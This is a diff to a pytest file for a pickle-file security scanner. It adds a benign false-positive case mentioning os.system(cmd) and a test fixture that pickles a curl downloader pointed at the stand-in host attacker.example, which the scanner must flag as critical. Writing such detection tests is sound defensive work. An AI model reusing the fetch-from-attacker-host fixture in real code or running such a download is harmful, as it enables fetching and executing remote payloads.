@@ -1089,6 +1089,7 @@ def test_scan_stream_detects_base64_encoded_execution_text(encoded: str, pattern
         "metadata = 'https://docs.example.invalid/requests.get(url)?a=1&b=2;c=3'",
         "description='docs'; metadata='https://docs.example.invalid/reference/requests.get(url)'",
         "metadata={'url':'https://docs.example.invalid/reference/requests.get(url)','offset':-1}",
+        "metadata={'open':True,'url':'https://docs.example.invalid/reference/os.system(cmd)'}",
         pytest.param(
             ("A" * 4096)
             + "https://docs.example.invalid/reference/requests.get(url)"
@@ -1391,6 +1392,14 @@ def test_run_root_raw_detectors_filters_completed_raw_slice(monkeypatch: pytest.
     scanner._run_root_raw_detectors(data, result, "slice.pkl")
 
     assert observed_allow_filtering == [True]
+
+
+def test_scan_stream_keeps_split_downloader_pickle_url_actionable() -> None:
+    payload = pickle.dumps({"argv": [b"curl"], "url": "https://attacker.example/payload"}, protocol=4)
+
+    result = PickleScanner().scan_stream(io.BytesIO(payload), len(payload), source="split-downloader.pkl")
+
+    _assert_critical_explicit_url(result, "https://attacker.example/payload")
 
 
 def test_scan_stream_keeps_network_reduce_url_actionable() -> None:
